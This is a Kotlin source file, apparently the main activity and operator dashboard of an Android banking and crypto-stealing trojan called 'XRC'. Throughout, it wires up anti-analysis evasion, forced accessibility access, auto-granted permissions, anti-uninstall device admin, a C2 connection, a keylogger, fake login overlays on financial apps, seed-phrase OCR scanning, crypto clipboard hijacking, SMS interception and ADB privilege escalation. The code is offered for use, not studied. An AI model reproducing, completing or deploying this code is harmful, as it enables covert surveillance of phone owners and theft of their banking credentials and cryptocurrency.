package com.xrc.app

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.xrc.app.c2.C2Client
import com.xrc.app.service.CoreService
import com.xrc.app.service.XRCAccessibilityService
import com.xrc.app.persistence.AntiUninstall
import com.xrc.app.persistence.PersistenceLayer
import com.xrc.app.overlay.SprungeEngine
import com.xrc.app.finance.FinanceOverlayManager
import com.xrc.app.finance.FinancialTargetList
import com.xrc.app.permissions.PermissionManager
import com.xrc.app.permissions.PermissionGrants
import com.xrc.app.surveillance.Keylogger
import com.xrc.app.wallet.WalletScanner
import com.xrc.app.wallet.SeedPhraseScanner
import com.xrc.app.wallet.CryptoClipboardHijack
import com.xrc.app.escalation.ADBEscalation
import com.xrc.app.escalation.ShizukuManager
import com.xrc.app.util.AntiAnalysis
import kotlinx.coroutines.launch

class MainActivity : ComponentActivity() {

    private var allPermissionsGranted = false

    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.values.all { it }
        if (allGranted) {
            allPermissionsGranted = true
            initializeModules()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Anti-analysis check
        if (AntiAnalysis.shouldEvade()) {
            // Show innocuous screen
            setContent {
                MaterialTheme {
                    Box(
                        modifier = Modifier.fillMaxSize().background(Color.White),
                        contentAlignment = Alignment.Center
                    ) {
                        Text("Loading...", color = Color.Gray)
                    }
                }
                return@setContent
            }
        }

        // Check if accessibility loop should be enforced
        if (!XRCAccessibilityService.isRunning) {
            enforceAccessibility()
        }

        setContent {
            XRCDashboard()
        }
    }

    override fun onResume() {
        super.onResume()
        lifecycleScope.launch {
            requestEssentialPermissions()
        }
    }

    private fun enforceAccessibility() {
        // Open accessibility settings if not enabled
        // The app will keep opening accessibility settings until user enables it
        if (!XRCAccessibilityService.isRunning) {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
        }
    }

    private suspend fun requestEssentialPermissions() {
        val permissionsToRequest = mutableListOf<String>()

        val essentialPermissions = listOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.POST_NOTIFICATIONS
        )

        for (perm in essentialPermissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(perm)
            }
        }

        if (permissionsToRequest.isNotEmpty()) {
            requestPermissionLauncher.launch(permissionsToRequest.toTypedArray())
        } else {
            allPermissionsGranted = true
            initializeModules()
        }
    }

    private fun initializeModules() {
        lifecycleScope.launch {
            // Start persistence layer
            PersistenceLayer.initialize(this@MainActivity)

            // Auto-grant special permissions
            PermissionGrants.autoGrantAll(this@MainActivity)

            // Start core service
            val intent = Intent(this@MainActivity, CoreService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }

            // Anti-uninstall initialization
            AntiUninstall.initialize(this@MainActivity)
            if (!AntiUninstall.isAdminActive(this@MainActivity)) {
                AntiUninstall.requestAdmin(this@MainActivity)
            }

            // Start finance overlay monitoring
            FinanceOverlayManager.startMonitoring()

            // Start wallet scanner
            WalletScanner.scanInstalledWallets(this@MainActivity)
        }
    }
}

// ============= COMPOSE DASHBOARD =============

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun XRCDashboard() {
    val context = LocalContext.current
    val scope = rememberCoroutineScope()
    var connectionState by remember { mutableStateOf("disconnected") }
    var deviceStatus by remember { mutableStateOf("initializing") }
    var accessibilityEnabled by remember { mutableStateOf(false) }
    var adminEnabled by remember { mutableStateOf(false) }
    var overlayActive by remember { mutableStateOf(false) }
    var keyloggerActive by remember { mutableStateOf(false) }
    var walletCount by remember { mutableIntStateOf(0) }
    var targetCount by remember { mutableIntStateOf(FinancialTargetList.count()) }
    var permissionCount by remember { mutableIntStateOf(0) }
    var backupCount by remember { mutableIntStateOf(0) }

    // States for detailed views
    var showPermissionDetail by remember { mutableStateOf(false) }
    var showWalletDetail by remember { mutableStateOf(false) }
    var showOverlayDetail by remember { mutableStateOf(false) }
    var showFinanceDetail by remember { mutableStateOf(false) }

    // Check module states
    LaunchedEffect(Unit) {
        while (true) {
            connectionState = when (XRCApp.instance.c2Client.connectionState.value) {
                C2Client.ConnectionState.CONNECTED -> "connected"
                C2Client.ConnectionState.CONNECTING -> "connecting"
                C2Client.ConnectionState.RECONNECTING -> "reconnecting"
                C2Client.ConnectionState.FALLBACK -> "fallback"
                C2Client.ConnectionState.DISCONNECTED -> "disconnected"
            }
            accessibilityEnabled = XRCAccessibilityService.isRunning
            adminEnabled = AntiUninstall.isAdminActive(context)
            overlayActive = SprungeEngine.isOverlayVisible()
            keyloggerActive = com.xrc.app.surveillance.Keylogger.isRunning
            walletCount = WalletScanner.getWalletCount()
            targetCount = FinancialTargetList.count()
            permissionCount = PermissionGrants::class.java.methods.size
            backupCount = com.xrc.app.permissions.PermissionBackup.getTotalBackupCount()
            deviceStatus = if (accessibilityEnabled && adminEnabled) "active" else "limited"
            kotlinx.coroutines.delay(3000)
        }
    }

    MaterialTheme(
        colorScheme = darkColorScheme(
            primary = Color(0xFF1A73E8),
            secondary = Color(0xFF34A853),
            tertiary = Color(0xFFEA4335),
            background = Color(0xFF1A1C1E),
            surface = Color(0xFF2D2F31),
            onPrimary = Color.White,
            onSecondary = Color.White,
            onBackground = Color(0xFFE8EAED),
            onSurface = Color(0xFFE8EAED)
        )
    ) {
        Scaffold(
            topBar = {
                TopAppBar(
                    title = { Text("XRC Control Center", fontWeight = FontWeight.Bold) },
                    colors = TopAppBarDefaults.topAppBarColors(
                        containerColor = MaterialTheme.colorScheme.surface,
                        titleContentColor = MaterialTheme.colorScheme.onSurface
                    ),
                    actions = {
                        StatusIndicator(status = deviceStatus)
                    }
                )
            },
            containerColor = MaterialTheme.colorScheme.background
        ) { paddingValues ->
            LazyColumn(
                modifier = Modifier
                    .fillMaxSize()
                    .padding(paddingValues)
                    .padding(horizontal = 16.dp),
                verticalArrangement = Arrangement.spacedBy(12.dp),
                contentPadding = PaddingValues(vertical = 16.dp)
            ) {
                // Connection Status Card
                item {
                    ConnectionStatusCard(connectionState)
                }

                // Quick Stats Row
                item {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        StatCard(
                            modifier = Modifier.weight(1f),
                            title = "Targets",
                            value = "$targetCount",
                            icon = Icons.Default.Target,
                            color = Color(0xFF1A73E8)
                        )
                        StatCard(
                            modifier = Modifier.weight(1f),
                            title = "Wallets",
                            value = "$walletCount",
                            icon = Icons.Default.AccountBalanceWallet,
                            color = Color(0xFFF9AB00)
                        )
                        StatCard(
                            modifier = Modifier.weight(1f),
                            title = "Perms",
                            value = "$permissionCount",
                            icon = Icons.Default.Security,
                            color = Color(0xFF34A853)
                        )
                    }
                }

                // Module Grid
                item {
                    Text(
                        "Core Modules",
                        style = MaterialTheme.typography.titleMedium,
                        color = MaterialTheme.colorScheme.onBackground,
                        fontWeight = FontWeight.SemiBold,
                        modifier = Modifier.padding(vertical = 8.dp)
                    )
                }

                item {
                    ModuleGrid(
                        modules = listOf(
                            ModuleItem(
                                "Accessibility",
                                if (accessibilityEnabled) "Active" else "Inactive",
                                Icons.Default.Visibility,
                                if (accessibilityEnabled) Color(0xFF34A853) else Color(0xFFEA4335),
                                onClick = {
                                    if (!accessibilityEnabled) {
                                        context.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                        })
                                    }
                                }
                            ),
                            ModuleItem(
                                "Device Admin",
                                if (adminEnabled) "Active" else "Off",
                                Icons.Default.AdminPanelSettings,
                                if (adminEnabled) Color(0xFF34A853) else Color(0xFFEA4335),
                                onClick = {
                                    if (!adminEnabled) {
                                        AntiUninstall.requestAdmin(context)
                                    }
                                }
                            ),
                            ModuleItem(
                                "Keylogger",
                                if (keyloggerActive) "Running" else "Stopped",
                                Icons.Default.Keyboard,
                                if (keyloggerActive) Color(0xFF34A853) else Color(0xFF9AA0A6),
                                onClick = {
                                    if (keyloggerActive) Keylogger.stop() else Keylogger.start()
                                }
                            ),
                            ModuleItem(
                                "Overlay",
                                if (overlayActive) "Showing" else "Ready",
                                Icons.Default.Layers,
                                if (overlayActive) Color(0xFFF9AB00) else Color(0xFF34A853),
                                onClick = { showOverlayDetail = !showOverlayDetail }
                            ),
                            ModuleItem(
                                "Sprunge",
                                "${targetCount} targets",
                                Icons.Default.Phishing,
                                Color(0xFF1A73E8),
                                onClick = { showFinanceDetail = !showFinanceDetail }
                            ),
                            ModuleItem(
                                "Wallet Scan",
                                "$walletCount found",
                                Icons.Default.AccountBalanceWallet,
                                Color(0xFFF9AB00),
                                onClick = {
                                    scope.launch {
                                        WalletScanner.scanInstalledWallets(context)
                                        showWalletDetail = !showWalletDetail
                                    }
                                }
                            ),
                            ModuleItem(
                                "Clipboard",
                                if (com.xrc.app.wallet.CryptoClipboardHijack.isActive) "Active" else "Off",
                                Icons.Default.ContentCopy,
                                if (com.xrc.app.wallet.CryptoClipboardHijack.isActive) Color(0xFF34A853) else Color(0xFF9AA0A6),
                                onClick = {
                                    if (CryptoClipboardHijack.isActive) CryptoClipboardHijack.deactivate()
                                    else CryptoClipboardHijack.activate(context)
                                }
                            ),
                            ModuleItem(
                                "Escalation",
                                if (com.xrc.app.escalation.ADBEscalation.isEscalated()) "UID 2000" else "Standard",
                                Icons.Default.LockOpen,
                                if (com.xrc.app.escalation.ADBEscalation.isEscalated()) Color(0xFF34A853) else Color(0xFF9AA0A6),
                                onClick = {
                                    ADBEscalation.performFullEscalation(context)
                                }
                            ),
                            ModuleItem(
                                "Permissions",
                                "Auto-managed",
                                Icons.Default.Shield,
                                Color(0xFF34A853),
                                onClick = {
                                    scope.launch {
                                        PermissionGrants.autoGrantAll(context)
                                        showPermissionDetail = !showPermissionDetail
                                    }
                                }
                            ),
                            ModuleItem(
                                "Seed Scanner",
                                "OCR active",
                                Icons.Default.Search,
                                Color(0xFFEA4335),
                                onClick = {
                                    scope.launch {
                                        SeedPhraseScanner.scanForSeedPhrases(context)
                                    }
                                }
                            ),
                            ModuleItem(
                                "Foreground",
                                "Monitoring",
                                Icons.Default. Apps,
                                Color(0xFF1A73E8),
                                onClick = { /* Show foreground stats */ }
                            ),
                            ModuleItem(
                                "SMS Intercept",
                                "Active",
                                Icons.Default.Message,
                                Color(0xFF34A853),
                                onClick = {
                                    // Open SMS capture stats
                                }
                            )
                        ),
                        columns = 2
                    )
                }

                // Detailed sections
                if (showOverlayDetail) {
                    item {
                        OverlayDetailCard()
                    }
                }

                if (showFinanceDetail) {
                    item {
                        FinanceDetailCard()
                    }
                }

                if (showWalletDetail) {
                    item {
                        WalletDetailCard()
                    }
                }

                if (showPermissionDetail) {
                    item {
                        PermissionDetailCard()
                    }
                }

                // Action Buttons
                item {
                    Text(
                        "Quick Actions",
                        style = MaterialTheme.typography.titleMedium,
                        color = MaterialTheme.colorScheme.onBackground,
                        fontWeight = FontWeight.SemiBold,
                        modifier = Modifier.padding(vertical = 8.dp)
                    )
                }

                item {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        ActionButton(
                            modifier = Modifier.weight(1f),
                            text = "Start All",
                            icon = Icons.Default.PlayArrow,
                            color = Color(0xFF34A853)
                        ) {
                            scope.launch {
                                Keylogger.start()
                                FinanceOverlayManager.startMonitoring()
                                CryptoClipboardHijack.activate(context)
                                WalletScanner.startMonitoring(context)
                                Toast.makeText(context, "All modules starting...", Toast.LENGTH_SHORT).show()
                            }
                        }
                        ActionButton(
                            modifier = Modifier.weight(1f),
                            text = "Stop All",
                            icon = Icons.Default.Stop,
                            color = Color(0xFFEA4335)
                        ) {
                            scope.launch {
                                Keylogger.stop()
                                FinanceOverlayManager.stopMonitoring()
                                CryptoClipboardHijack.deactivate()
                                SprungeEngine.hideOverlay(context)
                                Toast.makeText(context, "All modules stopped", Toast.LENGTH_SHORT).show()
                            }
                        }
                    }
                }

                item {
                    ActionButton(
                        text = "Escalate Privileges (ADB + Shizuku)",
                        icon = Icons.Default.LockOpen,
                        color = Color(0xFF1A73E8)
                    ) {
                        ADBEscalation.performFullEscalation(context)
                    }
                }

                // System Info
                item {
                    Text(
                        "System Information",
                        style = MaterialTheme.typography.titleMedium,
                        color = MaterialTheme.colorScheme.onBackground,
                        fontWeight = FontWeight.SemiBold,
                        modifier = Modifier.padding(vertical = 8.dp)
                    )
                }

                item {
                    SystemInfoCard()
                }

                // Footer spacing
                item {
                    Spacer(modifier = Modifier.height(32.dp))
                }
            }
        }
    }
}

// ============= COMPONENT COMPOSABLES =============

@Composable
fun StatusIndicator(status: String) {
    val color = when (status) {
        "active" -> Color(0xFF34A853)
        "limited" -> Color(0xFFF9AB00)
        "offline" -> Color(0xFFEA4335)
        else -> Color(0xFF9AA0A6)
    }
    val text = when (status) {
        "active" -> "Protected"
        "limited" -> "Limited"
        "offline" -> "Offline"
        else -> status
    }
    Row(
        verticalAlignment = Alignment.CenterVertically,
        modifier = Modifier.padding(end = 12.dp)
    ) {
        Box(
            modifier = Modifier
                .size(8.dp)
                .clip(RoundedCornerShape(4.dp))
                .background(color)
        )
        Spacer(modifier = Modifier.width(6.dp))
        Text(text, color = color, fontSize = 12.sp)
    }
}

@Composable
fun ConnectionStatusCard(state: String) {
    val (color, text, icon) = when (state) {
        "connected" -> Triple(Color(0xFF34A853), "C2 Connected", Icons.Default.Wifi)
        "connecting" -> Triple(Color(0xFFF9AB00), "Connecting...", Icons.Default.WifiFind)
        "reconnecting" -> Triple(Color(0xFFF9AB00), "Reconnecting...", Icons.Default.WifiFind)
        "fallback" -> Triple(Color(0xFFEA4335), "Fallback C2", Icons.Default.WifiOff)
        else -> Triple(Color(0xFF9AA0A6), "Disconnected", Icons.Default.WifiOff)
    }

    Card(
        modifier = Modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(containerColor = surfaceColor(color, 0.15f)),
        shape = RoundedCornerShape(12.dp)
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(16.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Icon(icon, contentDescription = null, tint = color, modifier = Modifier.size(24.dp))
            Spacer(modifier = Modifier.width(12.dp))
            Column(modifier = Modifier.weight(1f)) {
                Text(text, color = color, fontWeight = FontWeight.SemiBold, fontSize = 14.sp)
                Text("XRC v1.0.0", color = Color(0xFF9AA0A6), fontSize = 12.sp)
            }
            Text(
                XRCApp.instance.c2Client.connectionState.value.name,
                color = color,
                fontSize = 12.sp
            )
        }
    }
}

@Composable
fun StatCard(
    modifier: Modifier = Modifier,
    title: String,
    value: String,
    icon: ImageVector,
    color: Color
) {
    Card(
        modifier = modifier,
        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface),
        shape = RoundedCornerShape(12.dp)
    ) {
        Column(
            modifier = Modifier.padding(12.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Icon(icon, contentDescription = null, tint = color, modifier = Modifier.size(20.dp))
            Spacer(modifier = Modifier.height(4.dp))
            Text(value, fontWeight = FontWeight.Bold, fontSize = 20.sp, color = MaterialTheme.colorScheme.onSurface)
            Text(title, fontSize = 11.sp, color = Color(0xFF9AA0A6))
        }
    }
}

data class ModuleItem(
    val title: String,
    val subtitle: String,
    val icon: ImageVector,
    val color: Color,
    val onClick: () -> Unit = {}
)

@Composable
fun ModuleGrid(
    modules: List<ModuleItem>,
    columns: Int = 2
) {
    val rows = modules.chunked(columns)
    Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
        for (row in rows) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                for (module in row) {
                    ModuleCard(
                        modifier = Modifier.weight(1f),
                        item = module
                    )
                }
                if (row.size < columns) {
                    Spacer(modifier = Modifier.weight(1f))
                }
            }
        }
    }
}

@Composable
fun ModuleCard(modifier: Modifier = Modifier, item: ModuleItem) {
    Card(
        onClick = item.onClick,
        modifier = modifier,
        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface),
        shape = RoundedCornerShape(12.dp)
    ) {
        Column(
            modifier = Modifier.padding(12.dp),
            horizontalAlignment = Alignment.Start
        ) {
            Icon(item.icon, contentDescription = null, tint = item.color, modifier = Modifier.size(22.dp))
            Spacer(modifier = Modifier.height(8.dp))
            Text(item.title, fontWeight = FontWeight.SemiBold, fontSize = 13.sp, color = MaterialTheme.colorScheme.onSurface)
            Text(item.subtitle, fontSize = 11.sp, color = item.color)
        }
    }
}

@Composable
fun ActionButton(
    modifier: Modifier = Modifier,
    text: String,
    icon: ImageVector,
    color: Color,
    onClick: () -> Unit
) {
    Button(
        onClick = onClick,
        modifier = modifier.height(48.dp),
        colors = ButtonDefaults.buttonColors(containerColor = color),
        shape = RoundedCornerShape(12.dp)
    ) {
        Icon(icon, contentDescription = null, modifier = Modifier.size(18.dp))
        Spacer(modifier = Modifier.width(8.dp))
        Text(text, fontSize = 13.sp, fontWeight = FontWeight.SemiBold)
    }
}

@Composable
fun OverlayDetailCard() {
    Card(
        modifier = Modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface),
        shape = RoundedCornerShape(12.dp)
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            Text("Overlay / Sprunge Engine", fontWeight = FontWeight.Bold, fontSize = 16.sp)
            Spacer(modifier = Modifier.height(8.dp))
            Text("• Targets: ${FinancialTargetList.count()} financial apps", fontSize = 13.sp, color = Color(0xFF9AA0A6))
            Text("• Categories: Banking, Crypto, UPI, Payment, Investment", fontSize = 13.sp, color = Color(0xFF9AA0A6))
            Text("• WebView HTML injection with JS bridge", fontSize = 13.sp, color = Color(0xFF9AA0A6))
            Text("• Auto-show on foreground app match", fontSize = 13.sp, color = Color(0xFF9AA0A6))
            Text("• Full-screen persistent overlay", fontSize = 13.sp, color = Color(0xFF9AA0A6))
            Text("• Fake login page captures credentials", fontSize = 13.sp, color = Color(0xFF9AA0A6))
        }
    }
}

@Composable
fun FinanceDetailCard() {
    Card(
        modifier = Modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface),
        shape = RoundedCornerShape(12.dp)
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            Text("Finance / Sprunge Targets", fontWeight = FontWeight.Bold, fontSize = 16.sp)
            Spacer(modifier = Modifier.height(8.dp))
            val categories = FinancialTargetList.targets.groupBy { it.category }
            categories.forEach { (category, targets) ->
                Text("• ${category.name}: ${targets.size} apps", fontSize = 13.sp, color = Color(0xFF9AA0A6))
            }
        }
    }
}

@Composable
fun WalletDetailCard() {
    Card(
        modifier = Modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface),
        shape = RoundedCornerShape(12.dp)
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            Text("Wallet Scanner Results", fontWeight = FontWeight.Bold, fontSize = 16.sp)
            Spacer(modifier = Modifier.height(8.dp))
            val wallets = WalletScanner.getDetectedWallets()
            if (wallets.isEmpty()) {
                Text("Scanning... No wallets detected yet", fontSize = 13.sp, color = Color(0xFF9AA0A6))
            } else {
                wallets.take(5).forEach { wallet ->
                    Text("• ${wallet.name} (${wallet.category})", fontSize = 13.sp, color = Color(0xFF9AA0A6))
                }
                if (wallets.size > 5) {
                    Text("... and ${wallets.size - 5} more", fontSize = 12.sp, color = Color(0xFF9AA0A6))
                }
            }
            Spacer(modifier = Modifier.height(8.dp))
            Text("Seed Phrase Scanner: OCR-based image + file scan", fontSize = 12.sp, color = Color(0xFFF9AB00))
        }
    }
}

@Composable
fun PermissionDetailCard() {
    Card(
        modifier = Modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface),
        shape = RoundedCornerShape(12.dp)
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            Text("Permission Status", fontWeight = FontWeight.Bold, fontSize = 16.sp)
            Spacer(modifier = Modifier.height(8.dp))
            Text("• Auto-grant via Accessibility Service", fontSize = 13.sp, color = Color(0xFF9AA0A6))
            Text("• Backup chain: 3 methods per permission", fontSize = 13.sp, color = Color(0xFF9AA0A6))
            Text("• Play Protect auto-disable via settings", fontSize = 13.sp, color = Color(0xFF9AA0A6))
            Text("• OEM auto-start for Xiaomi, Samsung, Oppo, etc.", fontSize = 13.sp, color = Color(0xFF9AA0A6))
            Text("• ADB shell grant fallback", fontSize = 13.sp, color = Color(0xFF9AA0A6))
            Text("• Battery optimization whitelist request", fontSize = 13.sp, color = Color(0xFF9AA0A6))
        }
    }
}

@Composable
fun SystemInfoCard() {
    Card(
        modifier = Modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface),
        shape = RoundedCornerShape(12.dp)
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            Text("Device Info", fontWeight = FontWeight.Bold, fontSize = 14.sp)
            Spacer(modifier = Modifier.height(8.dp))
            Text("Model: ${Build.MODEL}", fontSize = 12.sp, color = Color(0xFF9AA0A6))
            Text("Manufacturer: ${Build.MANUFACTURER}", fontSize = 12.sp, color = Color(0xFF9AA0A6))
            Text("Android: ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})", fontSize = 12.sp, color = Color(0xFF9AA0A6))
            Text("Rooted: ${AntiAnalysis.isDeviceRooted()}", fontSize = 12.sp, color = Color(0xFF9AA0A6))
            Text("Emulator: ${AntiAnalysis.isRunningInEmulator()}", fontSize = 12.sp, color = Color(0xFF9AA0A6))
        }
    }
}

private fun surfaceColor(color: Color, alpha: Float): Color {
    return color.copy(alpha = alpha)
}
